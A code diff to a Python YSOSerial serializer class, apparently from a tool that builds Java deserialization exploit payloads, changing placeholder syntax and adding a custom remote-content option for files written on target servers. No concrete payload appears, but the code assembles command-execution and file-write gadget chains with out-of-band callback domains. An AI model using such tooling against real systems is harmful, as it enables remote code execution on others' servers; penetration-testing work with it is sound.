@@ -106,17 +106,19 @@ class YSOSerial(Serializer):
         remote_file = self.chainOpts.remote_file
         remote_dir = os.path.dirname(remote_file)
         remote_port = int(self.chainOpts.remote_port)
+        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else jsp_code
         java_classname = self.chainOpts.java_classname
-        if '%domain%' in self.chainOpts.java_remote_class_url and not interact_domain:
-            logging.warning("%domain% in java remote class URL but no interact domain provided")
+        if '%%domain%%' in self.chainOpts.java_remote_class_url and not interact_domain:
+            logging.warning("%%domain%% in java remote class URL but no interact domain provided")
             java_remote_class_url = None
         else:
-            java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%domain%', interact_domain)
+            java_remote_class_url = self.chainOpts.java_remote_class_url.replace('%%domain%%', interact_domain)
 
         logging.info(f"System command: {system_command}")
         logging.info(f"JSP Code: {jsp_code}")
         logging.info(f"Python Code: {py_code}")
         logging.info(f"File written on remote server: {remote_file}")
+        logging.info(f"Content written on server: {remote_content}")
         logging.info(f"Interact domain: {interact_domain}")
 
         # create an empty file that will contain JSP and Python file with the payload
@@ -147,33 +149,38 @@ class YSOSerial(Serializer):
 
 
             chain_system_command = system_command
-            chain_system_command = chain_system_command.replace('%chain_id%', chain['id'])
-            chain_system_command = chain_system_command.replace('%domain%', str(interact_domain))
-            chain_system_command = chain_system_command.replace("'", "\\'")
+            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
+            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
+            escaped_chain_system_command = chain_system_command.replace("'", "\\'")
 
             chain_jsp_code = jsp_code
-            chain_jsp_code = chain_jsp_code.replace('%system_command%', chain_system_command)
-            chain_jsp_code = chain_jsp_code.replace('%domain%', str(interact_domain))
-            chain_jsp_code = chain_jsp_code.replace('%chain_id%', chain['id'])
+            chain_jsp_code = chain_jsp_code.replace('%%system_command%%', escaped_chain_system_command)
+            chain_jsp_code = chain_jsp_code.replace('%%domain%%', str(interact_domain))
+            chain_jsp_code = chain_jsp_code.replace('%%chain_id%%', chain['id'])
+
+            chain_remote_content = remote_content
+            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
+            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
+            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])
 
             chain_py_code = py_code
-            chain_py_code = chain_py_code.replace('%system_command%', chain_system_command)
-            chain_py_code = chain_py_code.replace('%domain%', str(interact_domain))
-            chain_py_code = chain_py_code.replace('%chain_id%', chain['id'])
+            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
+            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
+            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])
 
             chainArguments = format
-            chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_jsp_code.encode('ascii')).decode('ascii'))
+            chainArguments = chainArguments.replace('<base64>', base64.b64encode(chain_remote_content.encode('ascii')).decode('ascii'))
             chainArguments = chainArguments.replace('<local_file>', fp.name)
             chainArguments = chainArguments.replace('<system_command>', chain_system_command)
             chainArguments = chainArguments.replace('<local_py_file>', pyFp.name)
-            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%ext%', 'jsp'))
-            chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%ext%', 'py'))
+            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'jsp'))
+            chainArguments = chainArguments.replace('<remote_py_file>', remote_file.replace('%%ext%%', 'py'))
             chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
             chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
             chainArguments = chainArguments.replace('<classname>', java_classname)
             chainArguments = chainArguments.replace('<domain>', str(interact_domain))
             chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-            chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%chain_id%', chain['id']))
+            chainArguments = chainArguments.replace('<remote_url>', str(java_remote_class_url).replace('%%chain_id%%', chain['id']))
             
             with open(fp.name, mode='w') as ft:
                 ft.write(chain_jsp_code)
